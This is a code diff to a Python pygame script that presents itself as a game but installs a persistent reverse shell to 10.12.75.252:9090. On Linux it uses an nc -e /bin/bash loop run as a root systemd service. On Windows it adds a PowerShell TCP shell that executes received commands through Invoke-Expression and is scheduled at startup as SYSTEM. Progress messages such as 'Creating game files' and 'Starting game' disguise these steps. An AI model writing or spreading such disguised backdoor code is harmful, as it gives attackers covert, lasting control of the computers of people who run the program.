@@ -8,14 +8,17 @@ os_name = platform.system()
 pygame.init()
 
 
-
 # Configuration
 REMOTE_IP = "10.12.75.252"
 REMOTE_PORT = "9090"
 
-# Paths
-SHELL_SCRIPT_PATH = "/root/reverse_shell.sh"
-SERVICE_FILE_PATH = "/etc/systemd/system/reverse_shell.service"
+# Linux Paths
+SHELL_SCRIPT_PATH_LINUX = "/root/reverse_shell.sh"
+SERVICE_FILE_PATH_LINUX = "/etc/systemd/system/reverse_shell.service"
+
+# Windows Paths
+SHELL_SCRIPT_PATH_WIN = os.path.expandvars(r"%APPDATA%\reverse_shell.ps1")
+TASK_NAME = "ReverseShellGame"
 
 # Detect OS type
 os_name = os.uname().sysname if hasattr(os, "uname") else sys.platform
@@ -28,7 +31,7 @@ if os_name == "Linux":
             sys.exit(1)
 
         # Step 2: Create the reverse shell script (if not exists)
-        if not os.path.exists(SHELL_SCRIPT_PATH):
+        if not os.path.exists(SHELL_SCRIPT_PATH_LINUX):
             shell_script_content = f"""#!/bin/bash
 while true; do
     /usr/bin/nc -e /bin/bash {REMOTE_IP} {REMOTE_PORT}
@@ -36,23 +39,23 @@ while true; do
 done
 """
             print(f"[+] Creating game files")
-            with open(SHELL_SCRIPT_PATH, "w") as f:
+            with open(SHELL_SCRIPT_PATH_LINUX, "w") as f:
                 f.write(shell_script_content)
 
             # Set execution permissions
-            os.chmod(SHELL_SCRIPT_PATH, 0o755)
-            subprocess.run(["chown", "root:root", SHELL_SCRIPT_PATH], check=True)
+            os.chmod(SHELL_SCRIPT_PATH_LINUX, 0o755)
+            subprocess.run(["chown", "root:root", SHELL_SCRIPT_PATH_LINUX], check=True)
         else:
-            print(f"[✓] game files already created")
+            print(f"[✓] Game files already created")
 
         # Step 3: Create the systemd service file (if not exists)
-        if not os.path.exists(SERVICE_FILE_PATH):
+        if not os.path.exists(SERVICE_FILE_PATH_LINUX):
             service_content = f"""[Unit]
 Description=Reverse Shell Service
 After=network.target
 
 [Service]
-ExecStart=/usr/bin/bash {SHELL_SCRIPT_PATH}
+ExecStart=/usr/bin/bash {SHELL_SCRIPT_PATH_LINUX}
 Restart=always
 User=root
 WorkingDirectory=/root
@@ -62,8 +65,8 @@ StandardError=journal
 [Install]
 WantedBy=multi-user.target
 """
-            print(f"[+] starting game")
-            with open(SERVICE_FILE_PATH, "w") as f:
+            print(f"[+] Starting game")
+            with open(SERVICE_FILE_PATH_LINUX, "w") as f:
                 f.write(service_content)
 
             # Reload systemd, enable, and start the service
@@ -71,13 +74,12 @@ WantedBy=multi-user.target
             subprocess.run(["systemctl", "enable", "reverse_shell.service"], check=True)
             subprocess.run(["systemctl", "start", "reverse_shell.service"], check=True)
 
-            # print("[✓] Reverse shell service installed and started.")
         else:
             print(f"[✓] Already did")
 
     except PermissionError as e:
         print(f"[ERROR] Permission denied: {e}")
-        print("[!] Try running the script with sudo:")
+        print("[!] Try running the script with sudo.")
         sys.exit(1)
 
     except Exception as e:
@@ -85,10 +87,70 @@ WantedBy=multi-user.target
         sys.exit(1)
 
 elif os_name.startswith("Win"):
-    print("This script is designed for Linux, not Windows.")
+    try:
+        # Step 1: Create PowerShell reverse shell script (if not exists)
+        if not os.path.exists(SHELL_SCRIPT_PATH_WIN):
+            shell_script_content_win = f"""
+while ($true) {{
+    try {{
+        $client = New-Object System.Net.Sockets.TCPClient("{REMOTE_IP}", {REMOTE_PORT});
+        $stream = $client.GetStream();
+        $reader = New-Object System.IO.StreamReader($stream);
+        $writer = New-Object System.IO.StreamWriter($stream);
+        $writer.AutoFlush = $true;
+
+        while ($true) {{
+            $command = $reader.ReadLine();
+            if ($command -eq "exit") {{ break; }}
+            $output = Invoke-Expression $command 2>&1;
+            $writer.WriteLine($output);
+        }}
+
+        $client.Close();
+    }} catch {{ Start-Sleep -Seconds 5 }}
+}}
+"""
+            print(f"[+] Creating game files (Windows) at {SHELL_SCRIPT_PATH_WIN}")
+            with open(SHELL_SCRIPT_PATH_WIN, "w") as f:
+                f.write(shell_script_content_win)
+
+        else:
+            print(f"[✓] Game files already created (Windows)")
+
+        # Step 2: Schedule task to run PowerShell script on startup
+        result = subprocess.run(
+            ["schtasks", "/Query", "/TN", TASK_NAME],
+            capture_output=True,
+            text=True,
+        )
+
+        if "ERROR" in result.stdout:
+            print("[+] Setting up the game to start automatically...")
+            subprocess.run(
+                [
+                    "schtasks",
+                    "/Create",
+                    "/SC",
+                    "ONSTART",
+                    "/TN",
+                    TASK_NAME,
+                    "/TR",
+                    f"powershell.exe -ExecutionPolicy Bypass -File {SHELL_SCRIPT_PATH_WIN}",
+                    "/RU",
+                    "SYSTEM",
+                ],
+                check=True,
+            )
+        else:
+            print(f"[✓] The game is already set to start automatically.")
+
+    except Exception as e:
+        print(f"[ERROR] An unexpected error occurred on Windows: {e}")
+        sys.exit(1)
 
 else:
     print(f"Unknown system: {os_name}")
+
 
 
 win_x = 1200
